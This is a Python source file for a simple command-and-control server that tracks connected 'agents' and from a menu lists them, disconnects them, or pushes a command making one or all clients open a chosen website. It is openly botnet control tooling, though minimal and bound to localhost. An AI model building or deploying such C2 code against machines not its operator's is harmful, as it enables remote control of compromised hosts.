import socket
import subprocess, sys
from datetime import datetime
import threading, time


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

ip_address = '127.0.0.1'

port_number = 3000

thread_index = 0
THREADS = []
clientmap = {}


def handle_connection(connection, address, thread_index):
    global THREADS
    global stop_thread
    last_keep_alive = time.time()
    while True:
        data = connection.recv(16)
        if time.time() - last_keep_alive > 5:
            print("closing connection due to inactivity")
            break
        if data:
            msg = data.decode().strip()
            # Check if the data is the "keep alive" message
            if msg == "keep alive":
                last_keep_alive = time.time()
            elif msg == 'quit' or msg == '':
                break
            else:
                print("received data:", data.decode())
        else:
            break

    #while msg!='quit' and msg!="":
        #print(msg)
        #connection.send(msg.encode())
        #msg = connection.recv(1024).decode()
    print("connection with {} is lost".format(THREADS[thread_index].name))
    THREADS.remove(threading.current_thread())
    close_connection(connection)


def close_connection(connection):
    connection.close()

def init_server():
    global clientmap
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_address, port_number))
    server_socket.listen(5)
    print("Server is up")
    while True:
        connection, address = server_socket.accept()
        thread_index=len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address,len(THREADS)))
        clientmap[t]=connection
        #print("Got new connection {}".format(t.name))
        THREADS.append(t)
        t.start()

def returnAllAgents():
    mythreads = threading.enumerate()
    curr_threads = []
    for t in THREADS:
        if t in mythreads:
            curr_threads.append(t)
    if not curr_threads:
        print("Don't have any agents at the moment")
    else:
        print(bcolors.ENDC)
        for agent in curr_threads:
            print(agent)
    time.sleep(1)
    input(bcolors.OKBLUE+"send anything to back to mainpage\n\n\n")
    main_page()


def killAgent():
    global clientmap
    mythreads = threading.enumerate()
    curr_threads = []
    for t in THREADS:
        if t in mythreads:
            curr_threads.append(t)
    if not curr_threads:
        print("Don't have any agents at the moment")
    else:
        print("Please send the number indicated on the left to the selected thread.")
        print(bcolors.ENDC+"to kill all the active threads send - \'all\'")
        print(bcolors.ENDC)
        for i in range(len(curr_threads)):
            print(i,"  :   ",curr_threads[i])
        typedvalue = input()
        if typedvalue == 'all':
            for closingthread in curr_threads:
                closing_connection = clientmap.get(closingthread)
                msg = 'quit'
                closing_connection.send(msg.encode())
                close_connection(closing_connection)
                time.sleep(1)
                print("\n" * 20)
        elif 0 <= int(typedvalue) < len(curr_threads):
            closingthread = curr_threads[int(typedvalue)]
            closing_connection = clientmap.get(closingthread)
            msg = 'quit'
            closing_connection.send(msg.encode())
            close_connection(closing_connection)
            time.sleep(1)
            print("\n" * 20)
        else:
            print("\n\nunauthorized value has been sent.\n")
    print("Redirecting to main menu ..\n")
    main_page()


def openweblink():
    global clientmap
    mythreads = threading.enumerate()
    curr_threads = []
    for t in THREADS:
        if t in mythreads:
            curr_threads.append(t)
    if not curr_threads:
        print("Don't have any agents at the moment")
    else:
        print("Please send the number indicated on the left to the selected thread.")
        print(bcolors.ENDC + "to send to all the active threads send - \'all\'")
        for i in range(len(curr_threads)):
            print(i,"  :   ",curr_threads[i])
        typedvalue = input()
        if typedvalue == 'all':
            msg = input("Type the link: without \'http://\'\n")
            msg = "3:" + msg
            for thread in curr_threads:
                thread_connection = clientmap.get(thread)
                thread_connection.send(msg.encode())
        elif typedvalue.isnumeric():
            if 0 <= int(typedvalue) < len(curr_threads):
                thread = curr_threads[int(typedvalue)]
                thread_connection = clientmap.get(thread)
                msg = input("Type the link: without \'http://\'\n")
                msg = "3:" + msg
                thread_connection.send(msg.encode())
            else:
                print("\n\nunauthorized value has been sent.\n")
        else:
            print("\n\nunauthorized value has been sent.\n")
    print("Redirecting to main menu ..\n")
    main_page()

def main_page():
    print(bcolors.HEADER+"Welcome to the C&C server:\nsend one of the following numbers:"+bcolors.OKCYAN)
    print("1 - to check all the active agents")
    print("2 - to kill one/all active agents")
    print("3 - open a website in one/all clients")
    userInput=input()
    print(bcolors.OKGREEN)
    if userInput=='1':
        returnAllAgents()
    elif userInput=='2':
        killAgent()
    elif userInput=='3':
        openweblink()
    else:
        print("unauthorized value, please type existing value\n\n\n")
        main_page()


if __name__ == "__main__":
    s1 = threading.Thread(target=init_server)
    s1.start()
    time.sleep(1)
    main_page()
